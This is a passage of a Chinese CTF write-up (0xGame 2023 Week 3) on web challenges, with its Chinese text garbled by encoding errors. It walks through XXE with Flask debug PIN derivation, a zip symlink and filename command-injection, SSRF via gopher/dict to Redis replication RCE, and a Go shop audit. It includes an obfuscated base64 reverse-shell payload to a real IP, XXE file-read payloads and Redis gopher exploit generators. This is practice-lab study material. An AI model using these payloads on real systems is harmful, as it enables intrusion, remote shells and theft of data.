--no-literal-eval è¿™é‡Œç”±äºcookieå‘¨å›´è¢«åŒå¼•å·åŒ…å›´ï¼Œæ•…æˆ‘ä»¬é‡Œé¢çš„shellåªèƒ½éƒ½ç”¨å•å¼•å·ï¼Œèµ·å†²çªçš„æˆ‘ä»¬è¦ç”¨\\è½¬ä¹‰ ![image-20231104110414689](0xGame 2023/image-20231104110414689.png) å¦‚å›¾æˆåŠŸåŠ å¯†ï¼Œæˆ‘ä»¬åˆ·æ–°é¡µé¢bpæŠ“åŒ…ï¼Œæ›¿æ¢ä¸Šè¿°cookieå‘é€å³å¯ï¼ŒåŒæ—¶æˆ‘ä»¬çš„vpsè¦å¼€å¯ç›‘å¬ï¼ˆæ³¨æ„ç«¯å£è¦åœ¨å®‰å…¨ç»„æ”¾å¼€ï¼‰ ![image-20231104112644645](0xGame 2023/image-20231104112644645.png) ![image-20231104112416629](0xGame 2023/image-20231104112416629.png) ![image-20231104112349809](0xGame 2023/image-20231104112349809.png) æˆåŠŸåå¼¹shellæ‹¿åˆ°flag [Week 3] rss_parser è¿™é“é¢˜çœ‹ä¸æ‡‚ï¼Œå…ˆè·Ÿç€wpå¤ç°å®Œï¼Œæœ€åå­¦ç›¸å…³çŸ¥è¯†å§ from flask import Flask, render_template, request, redirect from urllib.parse import unquote from lxml import etree from io import BytesIO import requests import re app = Flask(__name__) @app.route('/', methods=['GET', 'POST']) def index(): if request.method == 'GET': return render_template('index.html') else: feed_url = request.form['url'] if not re.match(r'^(http|https)://', feed_url): return redirect('/') content = requests.get(feed_url).content tree = etree.parse(BytesIO(content), etree.XMLParser(resolve_entities=True)) result = {} rss_title = tree.find('/channel/title').text rss_link = tree.find('/channel/link').text rss_posts = tree.findall('/channel/item') result['title'] = rss_title result['link'] = rss_link result['posts'] = [] if len(rss_posts) &gt;= 10: rss_posts = rss_posts[:10] for post in rss_posts: post_title = post.find('./title').text post_link = post.find('./link').text result['posts'].append({'title': post_title, 'link': unquote(post_link)}) return render_template('index.html', feed_url=feed_url, result=result) if __name__ == '__main__': app.run(host='0.0.0.0', port=8000, debug=True) è¿™é‡Œé¢˜ç›®ç»™äº†æºç ï¼Œè¿™é‡Œçœ‹åˆ°å…³é”®è¯å°±æ˜¯xmlï¼Œetreeï¼ŒçŒœæµ‹å°±æ˜¯xxeæ¼æ´äº†ï¼Œç¿»äº†ç¿»ç¬”è®°ï¼š Pythonï¼š from lxml import etree xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) ä¸Šè¿°ä»£ç æ˜¯ç»å…¸çš„é˜²æ­¢è§£æå¤–éƒ¨xmlçš„é˜²å¾¡ä»£ç ï¼Œä¸é¢˜ç›®ç»™çš„ä»£ç è¿›è¡Œæ¯”è¾ƒresolve_entities=Trueï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“çš„å‘ç°é¢˜ç›®æ˜¯å­˜åœ¨xxeæ¼æ´çš„ å°†ä¸€ä¸ªç¬¦åˆ RSS Feed XML æ ‡å‡†çš„ payload æ”¾åˆ° HTTP æœåŠ¡å™¨ä¸Šå°±å¯ä»¥ XXE (ä¹Ÿå¯ä»¥å‚è€ƒ https://exp10it.cn/index.xml æ”¹ä¸€æ”¹) è¿™é‡Œæˆ‘æ„Ÿè§‰å‚è€ƒï¼šhttps://support.google.com/merchants/answer/160589?hl=zh-Hansä¹Ÿæ˜¯å¯ä»¥æ”¹æ”¹çš„ ä½†æ˜¯æ— æ³•ç›´æ¥è¯»å– /flag æ–‡ä»¶, è¿™é‡Œè€ƒå¯Ÿè·å– Flask åœ¨ Debug æ¨¡å¼ä¸‹çš„ PIN Code ä»¥å®ç° RCE https://xz.aliyun.com/t/8092 https://www.tr0y.wang/2022/05/16/SecMap-flask/ è¯»å– /sys/class/net/eth0/address &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE test [ &lt;!ENTITY file SYSTEM \"file:///sys/class/net/eth0/address\"&gt;]&gt; &lt;rss xmlns:atom=\"http://www.w3.org/2005/Atom\" version=\"2.0\"&gt; &lt;channel&gt; &lt;title&gt;&amp;file;&lt;/title&gt; &lt;link&gt;vps-ip&lt;/link&gt; &lt;item&gt; &lt;title&gt;test&lt;/title&gt; &lt;link&gt;vps-ip&lt;/link&gt; &lt;/item&gt; &lt;/channel&gt; &lt;/rss&gt; è‡³äºä¸ºä½•æ˜¯ä¸Šè¿°payloadè¿™ç§æ ¼å¼ï¼Œè¿™å°±å¾—å‚è€ƒä»£ç å¤„çš„ï¼š rss_title = tree.find('/channel/title').text rss_link = tree.find('/channel/link').text rss_posts = tree.findall('/channel/item') ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬çš„xml-payloadä¸­å¿…é¡»å«æœ‰channel/titleã€/channel/linkã€/channel/itemï¼Œåœ¨çœ‹å¦‚ä¸‹ post_title = post.find('./title').text post_link = post.find('./link').text è¿™æ„å‘³ç€æˆ‘ä»¬è¿˜è¦æœ‰/channel/item/titleã€/channel/item/link ![image-20231104182023515](0xGame 2023/image-20231104182023515.png) å¦‚å›¾æˆåŠŸè¯»å–ï¼š02:42:ac:1c:00:02 è½¬æ¢ä¸ºåè¿›åˆ¶2485378613250 print(int('02:42:ac:1c:00:02'.replace(':',''),16)) ç„¶åè¯»å– machine id æˆ–è€… boot id å› ä¸ºè¿™é‡Œä¸å­˜åœ¨ /etc/machine-id, æ‰€ä»¥è¯»å– /proc/sys/kernel/random/boot_id &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE test [ &lt;!ENTITY file SYSTEM \"file:///proc/sys/kernel/random/boot_id\"&gt;]&gt; &lt;rss xmlns:atom=\"http://www.w3.org/2005/Atom\" version=\"2.0\"&gt; &lt;channel&gt; &lt;title&gt;&amp;file;&lt;/title&gt; &lt;link&gt;vps-ip&lt;/link&gt; &lt;item&gt; &lt;title&gt;test&lt;/title&gt; &lt;link&gt;vps-ip&lt;/link&gt; &lt;/item&gt; &lt;/channel&gt; &lt;/rss&gt; ç»“æœä¸ºï¼š5dcbb593-2656-4e8e-a4e9-9a0afb803c47 ç„¶åæ ¹æ®ä¸Šé¢çš„æ–‡ç« , è¯»å– /proc/self/cgroup æ˜¾ç¤º 0::/, ä¹Ÿå°±æ˜¯æ²¡æœ‰ id å€¼, æ‰€ä»¥ä¸ç”¨æ‹¼æ¥, ç›´æ¥ç”¨ä¸Šé¢çš„ boot id å°±è¡Œ ![image-20231104182600936](0xGame 2023/image-20231104182600936.png) å‰©ä¸‹çš„ username å¯ä»¥é€šè¿‡è¯»å– /etc/passwd æ¥çŒœä¸€ä¸‹, ä¸€èˆ¬éƒ½æ˜¯ root æˆ–è€…æœ€åº•ä¸‹çš„ç”¨æˆ· app, å¤šè¯•å‡ ä¸ªå°±è¡Œ ![image-20231104182652180](0xGame 2023/image-20231104182652180.png) æœ€åéšä¾¿å¡«ä¸€ä¸ª url, æ¯”å¦‚ https://exp10it.cn/xxx å°±èƒ½åœ¨æŠ¥é”™é¡µé¢çœ‹åˆ° flask çš„è·¯å¾„ exp (æ³¨æ„æ–°ç‰ˆæœ¬ flask è®¡ç®— pin code æ—¶ç”¨çš„æ˜¯ sha1, æ—§ç‰ˆæœ¬æ‰æ˜¯ md5) import hashlib from itertools import chain probably_public_bits = [ 'app'# username 'flask.app',# modname 'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.9/site-packages/flask/app.py' # getattr(mod, '__file__', None), ] private_bits = [ '2485378613250',# str(uuid.getnode()), /sys/class/net/ens33/address '5dcbb593-2656-4e8e-a4e9-9a0afb803c47'# get_machine_id(), /etc/machine-id ] h = hashlib.sha1() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(\"utf-8\") h.update(bit) h.update(b\"cookiesalt\") cookie_name = f\"__wzd{h.hexdigest()[:20]}\" # If we need to generate a pin we salt it a bit more so that we don't # end up with the same value and generate out 9 digits num = None if num is None: h.update(b\"pinsalt\") num = f\"{int(h.hexdigest(), 16):09d}\"[:9] # Format the pincode in groups of digits for easier remembering if # we don't have a result yet. rv = None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = \"-\".join( num[x : x + group_size].rjust(group_size, \"0\") for x in range(0, len(num), group_size) ) break else: rv = num print(rv) ![image-20231104182908326](0xGame 2023/image-20231104182908326.png) è¿è¡Œå¾—åˆ°pinç  ä¹‹ååœ¨é¶æœºé¦–é¡µéšä¾¿è¾“å…¥ä¸€ä¸ªé”™è¯¯çš„ipåœ°å€ï¼Œè¿›å…¥æŠ¥é”™é¡µé¢ä¹‹ååœ¨å³ä¾§ç‚¹å‡»ä¸€ä¸ªå°é»‘æ¡†ï¼Œè¾“å…¥pin codeä¹‹åå¯ä»¥åœ¨å·¦ä¾§çœ‹åˆ°ä¸€ä¸ªå¯ä»¥æ‰§è¡Œpythonä»£ç çš„åœ°æ–¹ï¼Œå¦‚ä¸‹å›¾è¾“å…¥å³å¯å¾—åˆ°flag ![image-20231104183759696](0xGame 2023/image-20231104183759696.png) [Week 3] zip_file_manager from flask import Flask, request, render_template, redirect, send_file import hashlib import os app = Flask(__name__) def md5(m): return hashlib.md5(m.encode('utf-8')).hexdigest() @app.route('/unzip', methods=['POST']) def unzip(): f = request.files.get('file') if not f.filename.endswith('.zip'): return redirect('/') user_dir = os.path.join('./uploads', md5(request.remote_addr)) if not os.path.exists(user_dir): os.mkdir(user_dir) zip_path = os.path.join(user_dir, f.filename) dest_path = os.path.join(user_dir, f.filename[:-4]) f.save(zip_path) os.system('unzip -o {} -d {}'.format(zip_path, dest_path)) return redirect('/') @app.route('/', defaults={'subpath': ''}, methods=['GET']) @app.route('/&lt;path:subpath&gt;', methods=['GET']) def index(subpath): user_dir = os.path.join('./uploads', md5(request.remote_addr)) if not os.path.exists(user_dir): os.mkdir(user_dir) if '..' in subpath: return 'blacklist' current_path = os.path.join(user_dir, subpath) if os.path.isdir(current_path): res = [] res.append({'type': 'Directory', 'name': '..'}) for v in os.listdir(current_path): if os.path.isfile(os.path.join(current_path, v)): res.append({'type': 'File', 'name': v}) else: res.append({'type': 'Directory', 'name': v}) return render_template('index.html', upload_path=user_dir, res=res) else: return send_file(current_path) if __name__ == '__main__': app.run(host='0.0.0.0', port=8000, debug=False) æ ¹æ®é¢˜ç›®ç»™å‡ºçš„æºç ï¼Œæˆ‘ä»¬åˆ†æå‘ç°os.system('unzip -o {} -d {}'.format(zip_path, dest_path))æ­¤å¤„è¿›è¡Œäº†å‘½ä»¤æ‰§è¡Œï¼Œå‡­å€Ÿæˆ‘æµ…è–„çš„è®°å¿†ï¼Œæˆ‘è®¤å‡ºäº†è¿™é‡Œæ˜¯ç±»ä¼¼unzipçš„ç›¸å…³æ¼æ´ï¼Œå¯ä»¥ç”¨è½¯é“¾æ¥è¿›è¡ŒRCEçš„ indexå‡½æ•°ä¸­ï¼Œä¸»è¦å°±æ˜¯åˆ›å»ºä¸€ä¸ªzipæ–‡ä»¶ä¸Šä¼ åçš„ç›®å½•ï¼Œå…¶ä¸­è¿˜è¿‡æ»¤äº†..ä¹Ÿå°±æ˜¯é˜²æ­¢ç›®å½•ç©¿è¶Šï¼Œæœ€åè¿˜æå–ç›¸å…³å…³é”®è¯ï¼štypeã€nameç­‰ç­‰æ¥æ¸²æŸ“å‰ç«¯é¡µé¢ã€‚ unzipå‡½æ•°ä¸­ï¼Œä¸»è¦å°±æ˜¯å¯¹æˆ‘ä»¬ä¸Šä¼ çš„zipæ–‡ä»¶è¿›è¡Œè§£å‹ï¼Œå¹¶è¦†ç›–åŸæœ‰æ–‡ä»¶ï¼Œå°†è§£å‹å¾—åˆ°çš„æ–‡ä»¶ä¸Šä¼ è‡³-dæ‰€æŒ‡çš„ç›®å½•ä¸‹ æ–¹æ³•ä¸€ï¼š ä¼—æ‰€å‘¨çŸ¥ Linux å­˜åœ¨è½¯é“¾æ¥è¿™ä¸€åŠŸèƒ½, è€Œ zip æ”¯æŒå‹ç¼©è½¯é“¾æ¥, ç¨‹åºåˆæ˜¯ç”¨ unzip å‘½ä»¤è¿›è¡Œè§£å‹ç¼©, å› æ­¤ä¼šå­˜åœ¨è¿™ä¸ªæ¼æ´ (ç›¸æ¯”ä¹‹ä¸‹å¦‚æœä½¿ç”¨ Python çš„ zipfile åº“è¿›è¡Œè§£å‹ç¼©, å°±ä¸ä¼šå­˜åœ¨è¿™ä¸ªé—®é¢˜) ln -s / test zip -y test.zip test è½¯é“¾æ¥ç”¨æ³•æˆ‘è®¤ä¸ºå¯ä»¥å‚è€ƒï¼šLinux å‘½ä»¤ä¹‹è½¯è¿æ¥è¯¦è§£ è¿™é‡Œzipä½¿ç”¨-yå‘½ä»¤çš„åŸå› ï¼šzipå‹ç¼©ä¿æŒè½¯è¿æ¥ï¼Œä½¿ç”¨å‚æ•°-yï¼Œå¯ä»¥ä½¿zipèƒ½å¤Ÿä¿ç•™è½¯é“¾æ¥ã€‚ é‚£æˆ‘ä»¬åœ¨kaliä¸‹æ“ä½œä¸€ç•ª ![image-20231104193101598](0xGame 2023/image-20231104193101598.png) éšåæ‰¾åˆ°zipå¹¶ä¸Šä¼ è‡³é¶æœº ![image-20231104193207219](0xGame 2023/image-20231104193207219.png) å¦‚ä¸Šå›¾ç‚¹å‡»flagå³å¯ä¸‹è½½å¾—åˆ° æ–¹æ³•äºŒï¼š @app.route('/unzip', methods=['POST']) def unzip(): f = request.files.get('file') if not f.filename.endswith('.zip'): return redirect('/') user_dir = os.path.join('./uploads', md5(request.remote_addr)) if not os.path.exists(user_dir): os.mkdir(user_dir) zip_path = os.path.join(user_dir, f.filename) dest_path = os.path.join(user_dir, f.filename[:-4]) f.save(zip_path) os.system('unzip -o {} -d {}'.format(zip_path, dest_path)) return redirect('/') è°ƒç”¨ os.system æ‰§è¡Œ unzip å‘½ä»¤, ä½†æ˜¯è·¯å¾„æ˜¯ç›´æ¥æ‹¼æ¥è¿‡å»çš„, è€Œ zip çš„æ–‡ä»¶ååˆå¯æ§, è¿™é‡Œå­˜åœ¨ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„å‘½ä»¤æ³¨å…¥ burp ä¸Šä¼ æ—¶æŠ“åŒ…æŠŠ filename æ”¹æˆä¸‹é¢çš„å‘½ä»¤å³å¯ test.zip;bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi81NTU1ICAwPiYx}|{base64,-d}|{bash,-i}';1.zip ![image-20231104200335114](0xGame 2023/image-20231104200335114.png) bpå‘é€ï¼Œå¦‚ä¸‹å›¾æˆåŠŸåå¼¹shellï¼Œæ‹¿åˆ°flag ![image-20231104200329612](0xGame 2023/image-20231104200329612.png) æ¥ä¸‹æ¥æˆ‘åˆå¾ˆç–‘æƒ‘ä¸ºä½•è¿™é‡Œæ¶æ„å‘½ä»¤å‰åéœ€è¦ä¸¤ä¸ªzipåç¼€ ![image-20231104201010508](0xGame 2023/image-20231104201010508.png) å¦‚ä¸Šå›¾ï¼Œæˆ‘è‡ªå·±åˆ†æäº†ä¸€æ³¢æ„Ÿè§‰æ˜¯1.zipè‚¯å®šæ˜¯å¿…æœ‰çš„ï¼Œå› ä¸ºä»£ç ä¼šæ£€æµ‹filenameçš„åç¼€æ˜¯å¦å«æœ‰.zipï¼Œè€Œtest.zipçš„ä¿ç•™æˆ‘è®¤ä¸ºæ˜¯ä¸ºäº†ä»¤unzip -o {}å‘½ä»¤çš„æ­£å¸¸ä½¿ç”¨ï¼Œå¦‚æœæ²¡æœ‰test.zipï¼Œé‚£å°±æ˜¯-o bash -câ€¦é‚£è¿™é‡Œå°±ä¸å­˜åœ¨è¦è§£å‹çš„zipæ–‡ä»¶äº†ï¼Œä½†å¦‚æœæœ‰test.zipçš„è¯ï¼Œå°±æ˜¯-o test.zip;bashâ€¦ï¼Œå¾ˆæ˜æ˜¾-oæ˜¯è§£å‹test.txtçš„ï¼Œå¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“åˆ†æçš„å¯¹ä¸å¯¹ï¼Œå¸Œæœ›æ—¥åå¯ä»¥æœ‰ç¼˜çœ‹åˆ°åˆç†çš„è§£é‡Šâ”­â”®ï¹â”­â”® [Week 3] web_snapshot è¿™é“é¢˜çŸ¥è¯†ç‚¹æ˜¯ssrf+gopheræ‰“redisï¼ˆä¸»ä»å¤åˆ¶RCEï¼‰â€“æ²¡å­¦è¿‡ã€‚ã€‚ã€‚ã€‚å› æ­¤å…ˆè·Ÿç€å¤ç° é¢˜ç›®ä¼šé€šè¿‡ curl å‡½æ•°è¯·æ±‚ç½‘é¡µ, å¹¶å°† html æºç ä¿å­˜åœ¨ Redis æ•°æ®åº“ä¸­ è¯·æ±‚ç½‘é¡µçš„è¿‡ç¨‹å¾ˆæ˜æ˜¾å­˜åœ¨ ssrf, ä½†æ˜¯é™åˆ¶è¾“å…¥çš„ url åªèƒ½ä»¥ http / https å¼€å¤´ function _get($url) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_HEADER, 0); curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); $data = curl_exec($curl); curl_close($curl); return $data; } é¦–å…ˆæ³¨æ„ curl_setopt è®¾ç½®çš„å‚æ•° CURLOPT_FOLLOWLOCATION, ä»£è¡¨å…è®¸ curl æ ¹æ®è¿”å›å¤´ä¸­çš„ Location è¿›è¡Œé‡å®šå‘ å‚è€ƒ: https://www.php.net/manual/zh/function.curl-setopt.php ![https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207504.png](0xGame 2023/202311021207504.png) ![https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207029.png](0xGame 2023/202311021207029.png) ![https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207958.png](0xGame 2023/202311021207958.png) è€Œ curl æ”¯æŒ dict / gopher ç­‰åè®®, é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ Location å¤´æŠŠåè®®ä» http é‡å®šå‘è‡³ dict / gopher, è¿™ä¸ªæŠ€å·§åœ¨ä¸€äº›å…³äº ssrf çš„æ–‡ç« é‡Œé¢ä¹Ÿä¼šæåˆ° ç»“åˆ redis çš„çŸ¥è¯†ç‚¹, å¯ä»¥å°è¯• redis ä¸»ä»å¤åˆ¶ rce https://www.cnblogs.com/xiaozi/p/13089906.html https://github.com/Dliv3/redis-rogue-server --å·¥å…· payloadï¼š import requests import re def urlencode(data): enc_data = '' for i in data: h = str(hex(ord(i))).replace('0x', '') if len(h) == 1: enc_data += '%0' + h.upper() else: enc_data += '%' + h.upper() return enc_data def gen_payload(payload): redis_payload = '' for i in payload.split(' '): arg_num = '*' + str(len(i.split(' '))) redis_payload += arg_num + '\\r ' for j in i.split(' '): arg_len = '$' + str(len(j)) redis_payload += arg_len + '\\r ' redis_payload += j + '\\r ' gopher_payload = 'gopher://db:6379/_' + urlencode(redis_payload) return gopher_payload payload1 = ''' slaveof vps-ip 21000 config set dir /tmp config set dbfilename exp.so quit ''' payload2 = '''slaveof no one module load /tmp/exp.so system.exec 'env' quit ''' print(gen_payload(payload1)) print(gen_payload(payload2)) ![image-20231104225534463](0xGame 2023/image-20231104225534463.png) &lt;?php // step 1 //header('Location: gopher://db:6379/_%2A%31%0D%0A%24%30%0D%0A%0D%0A%2A%33%0D%0A%24%37%0D%0A%73%6C%61%76%65%6F%66%0D%0A%24%31%34%0D%0A%31%32%34%2E%32%32%30%2E%32%33%33%2E%32%36%0D%0A%24%35%0D%0A%36%35%35%33%34%0D%0A%2A%34%0D%0A%24%36%0D%0A%63%6F%6E%66%69%67%0D%0A%24%33%0D%0A%73%65%74%0D%0A%24%33%0D%0A%64%69%72%0D%0A%24%34%0D%0A%2F%74%6D%70%0D%0A%2A%34%0D%0A%24%36%0D%0A%63%6F%6E%66%69%67%0D%0A%24%33%0D%0A%73%65%74%0D%0A%24%31%30%0D%0A%64%62%66%69%6C%65%6E%61%6D%65%0D%0A%24%36%0D%0A%65%78%70%2E%73%6F%0D%0A%2A%31%0D%0A%24%34%0D%0A%71%75%69%74%0D%0A%2A%31%0D%0A%24%30%0D%0A%0D%0A'); // step 2 header('Location: gopher://db:6379/_%2A%31%0D%0A%24%30%0D%0A%0D%0A%2A%33%0D%0A%24%37%0D%0A%73%6C%61%76%65%6F%66%0D%0A%24%32%0D%0A%6E%6F%0D%0A%24%33%0D%0A%6F%6E%65%0D%0A%2A%33%0D%0A%24%36%0D%0A%6D%6F%64%75%6C%65%0D%0A%24%34%0D%0A%6C%6F%61%64%0D%0A%24%31%31%0D%0A%2F%74%6D%70%2F%65%78%70%2E%73%6F%0D%0A%2A%32%0D%0A%24%31%31%0D%0A%73%79%73%74%65%6D%2E%65%78%65%63%0D%0A%24%35%0D%0A%27%65%6E%76%27%0D%0A%2A%31%0D%0A%24%34%0D%0A%71%75%69%74%0D%0A%2A%31%0D%0A%24%30%0D%0A%0D%0A'); ?&gt; è¿™é‡Œå°†step1å’Œstep2åˆ†ä¸ºä¸¤ä¸ªphpæ–‡ä»¶ã€‚ åŒæ—¶åœ¨ vps ä¸Šå¯åŠ¨ä¸€ä¸ª php æœåŠ¡å™¨, ä¾‹å¦‚ php -S 0.0.0.0:65000, ç„¶åå°†ä¸Šè¿°ä¸¤ä¸ªPHPæ–‡ä»¶ä¸Šä¼ è‡³è¯¥phpæœåŠ¡çš„æ ¹ç›®å½•ä¸‹ï¼Œæœ€ååœ¨é¢˜ç›®å½“ä¸­å»è®¿é—®è¿™ä¸¤ä¸ªPHPæ–‡ä»¶ ![image-20231104225700858](0xGame 2023/image-20231104225700858.png) ![image-20231104225711072](0xGame 2023/image-20231104225711072.png) ![image-20231104225734808](0xGame 2023/image-20231104225734808.png) æ˜¾ç¤ºå¦‚å›¾æ‰€ç¤ºçš„çŠ¶æ€ï¼ŒåŒæ—¶è®°å¾—å¼€å¯Redis Rogue Serverçš„ç›‘å¬ ![image-20231104225828706](0xGame 2023/image-20231104225828706.png) å¦‚å›¾æ‰€ç¤ºï¼Œåœ¨è®¿é—®1.phpä¹‹åä¼šçœ‹åˆ°å¦‚å›¾æ‰€ç¤ºçš„çŠ¶æ€ï¼Œä»£è¡¨æˆåŠŸæ‰“å…¥ï¼Œè®°å¾—21000ç«¯å£è¦å¼€æ”¾ ä¹‹ååœ¨è®¿é—®2.phpä¹‹å ![image-20231104225922080](0xGame 2023/image-20231104225922080.png) ä¼šæ˜¾ç¤ºä¸Šå›¾æ‰€ç¤ºçš„linkï¼Œæˆ‘ä»¬è®¿é—®å³å¯çœ‹åˆ°envç¯å¢ƒå˜é‡ä¸­çš„flag ![image-20231104225322560](0xGame 2023/image-20231104225322560.png) è¿™é‡Œå¾—æ³¨æ„å‡ ä¸ªç‚¹ é¦–å…ˆ gopher å¾—åˆ†ä¸¤æ¬¡æ‰“, ä¸ç„¶ä½ åœ¨æ‰§è¡Œ slaveof IP Port å‘½ä»¤ä¹‹ååˆç«‹å³æ‰§è¡Œäº† slave of no one, è¿™å°±å¯¼è‡´æ ¹æœ¬æ²¡æœ‰æ—¶é—´å»ä¸»ä»å¤åˆ¶ exp.so å…¶æ¬¡åœ¨ä½¿ç”¨ gopher å‘é€ redis å‘½ä»¤çš„æ—¶å€™è®°å¾—ç»“å°¾åŠ ä¸Š quit, ä¸ç„¶ä¼šä¸€ç›´å¡ä½ ç„¶åæ³¨æ„ redis çš„ä¸»æœºåæ˜¯ db, è€Œä¸æ˜¯ 127.0.0.1, å› æ­¤è®¿é—® redis æ•°æ®åº“å¾—ç”¨ db:6379 å¦‚æœç”¨ dict åè®®æ‰“çš„è¯, å¾—è°ƒæ•´ä¸€ä¸‹ payload é¡ºåº dict://db:6379/config:set:dir:/tmp dict://db:6379/config:set:dbfilename:exp.so dict://db:6379/slaveof:host.docker.internal:21000 dict://db:6379/module:load:/tmp/exp.so dict://db:6379/slave:no:one dict://db:6379/system.exec:env dict://db:6379/module:unload:system å› ä¸ºæ¯æ¬¡æ‰§è¡Œå‘½ä»¤ä¹‹é—´ä¼šå­˜åœ¨ä¸€å®šçš„æ—¶é—´é—´éš”, æ‰€ä»¥å¾—å…ˆè®¾ç½® dir å’Œ dbfilename, ç„¶åå† slaveof, ä¸ç„¶æœ€ç»ˆåŒæ­¥çš„æ–‡ä»¶åå’Œè·¯å¾„è¿˜æ˜¯åŸæ¥çš„ /data/dump.rdb [Week 3] GoShop package main import ( \"crypto/rand\" \"embed\" \"fmt\" \"github.com/gin-contrib/sessions\" \"github.com/gin-contrib/sessions/cookie\" \"github.com/gin-gonic/gin\" \"github.com/google/uuid\" \"html/template\" \"net/http\" \"os\" \"strconv\" ) type User struct { Id string Money int64 Items map[string]int64 } type Product struct { Name string Price int64 } var users map[string]*User var products []*Product //go:embed public var fs embed.FS func init() { users = make(map[string]*User) products = []*Product{ {Name: \"Apple\", Price: 10}, {Name: \"Banana\", Price: 50}, {Name: \"Orange\", Price: 100}, {Name: \"Flag\", Price: 999999999}, } } func IndexHandler(c *gin.Context) { c.HTML(200, \"index.html\", gin.H{}) } func InfoHandler(c *gin.Context) { s := sessions.Default(c) if s.Get(\"id\") == nil { u := uuid.New().String() users[u] = &amp;User{Id: u, Money: 100, Items: make(map[string]int64)} s.Set(\"id\", u) s.Save() } user := users[s.Get(\"id\").(string)] c.JSON(200, gin.H{ \"user\": user, }) } func ResetHandler(c *gin.Context) { s := sessions.Default(c) s.Clear() u := uuid.New().String() users[u] = &amp;User{Id: u, Money: 100, Items: make(map[string]int64)} s.Set(\"id\", u) s.Save() c.JSON(200, gin.H{ \"message\": \"Reset success\", }) } func BuyHandler(c *gin.Context) { s := sessions.Default(c) user := users[s.Get(\"id\").(string)] data := make(map[string]interface{}) c.ShouldBindJSON(&amp;data) var product *Product for _, v := range products { if data[\"name\"] == v.Name { product = v break } } if product == nil { c.JSON(200, gin.H{ \"message\": \"No such product\", }) return } n, _ := strconv.Atoi(data[\"num\"].(string)) if n &lt; 0 { c.JSON(200, gin.H{ \"message\": \"Product num can't be negative\", }) return } if user.Money &gt;= product.Price*int64(n) { user.Money -= product.Price * int64(n) user.Items[product.Name] += int64(n) c.JSON(200, gin.H{ \"message\": fmt.Sprintf(\"Buy %v * %v success\", product.Name, n), }) } else { c.JSON(200, gin.H{ \"message\": \"You don't have enough money\", }) } } func SellHandler(c *gin.Context) { s := sessions.Default(c) user := users[s.Get(\"id\").(string)] data := make(map[string]interface{}) c.ShouldBindJSON(&amp;data) var product *Product for _, v := range products { if data[\"name\"] == v.Name { product = v break } } if product == nil { c.JSON(200, gin.H{ \"message\": \"No such product\", }) return } count := user.Items[data[\"name\"].(string)] n, _ := strconv.Atoi(data[\"num\"].(string)) if n &lt; 0 { c.JSON(200, gin.H{ \"message\": \"Product num can't be negative\", }) return } if count &gt;= int64(n) { user.Money += product.Price * int64(n) user.Items[product.Name] -= int64(n) c.JSON(200, gin.H{ \"message\": fmt.Sprintf(\"Sell %v * %v success\", product.Name, n), }) } else { c.JSON(200, gin.H{ \"message\": \"You don't have enough product\", }) } } func FlagHandler(c *gin.Context) { s := sessions.Default(c) user := users[s.Get(\"id\").(string)] v, ok := user.Items[\"Flag\"] if !ok || v &lt;= 0 { c.JSON(200, gin.H{ \"message\": \"You must buy &lt;code&gt;flag&lt;/code&gt; first\", }) return } flag, _ := os.ReadFile(\"/flag\") c.JSON(200, gin.H{ \"message\": fmt.Sprintf(\"Here is your flag: &lt;code&gt;%s&lt;/code&gt;\", string(flag)), }) } func main() { secret := make([]byte, 16) rand.Read(secret) tpl, _ := template.ParseFS(fs, \"public/index.html\") store := cookie.NewStore(secret) r := gin.Default() r.SetHTMLTemplate(tpl) r.Use(sessions.Sessions(\"gosession\", store)) r.GET(\"/\", IndexHandler) api := r.Group(\"/api\") { api.GET(\"/info\", InfoHandler) api.POST(\"/buy\", BuyHandler) api.POST(\"/sell\", SellHandler) api.GET(\"/flag\", FlagHandler) api.GET(\"/reset\", ResetHandler) } r.StaticFileFS(\"/static/main.js\", \"public/main.js\", http.FS(fs)) r.StaticFileFS(\"/static/simple.css\", \"public/simple.css\", http.FS(fs)) r.Run(\":8000\") } é¢˜ç›®æ˜¯ä¸€ä¸ªå•†åº—, åˆå§‹ money ä¸º 100, éœ€è¦è´­ä¹°é‡‘é¢ä¸º 999999999 çš„ flag å•†å“åæ‰èƒ½æ‹¿åˆ° flag è¿™é¢˜å°±æ˜¯å®¡è®¡ä»£ç ï¼Œä¸è¿‡æˆ‘ä¹Ÿæ²¡å­¦è¿‡goè¯­è¨€ï¼Œä¸è¿‡æˆ‘çœ‹äº†ä¸€ç•ªçŒœæµ‹é—®é¢˜å¯èƒ½ä¼šå‡ºç°åœ¨å¦‚ä¸‹ä½ç½®ï¼š ![image-20231105092845595](0xGame 2023/image-20231105092845595.png) ![image-20231105092853470](0xGame 2023/image-20231105092853470.png) è¿™é‡Œæ˜¯åˆ¤æ–­ç”¨æˆ·è´­ä¹°é‡‘é¢ä»¥åŠæ•°é‡çš„åœ°æ–¹ï¼Œæ¥ä¸‹æ¥å°±çœ‹wpäº† ç¨‹åºä½¿ç”¨äº† strconv.Atoi(data[\"num\"].(string)) å°† json ä¼ é€’çš„ num å­—ç¬¦ä¸²è½¬æ¢æˆäº† int ç±»å‹çš„å˜é‡ n åé¢åˆ¤æ–­ç”¨æˆ·çš„ money æ—¶å°†å…¶è½¬æ¢æˆäº† int64 ç±»å‹, è€Œ product.Price æœ¬èº«ä¹Ÿæ˜¯ int64 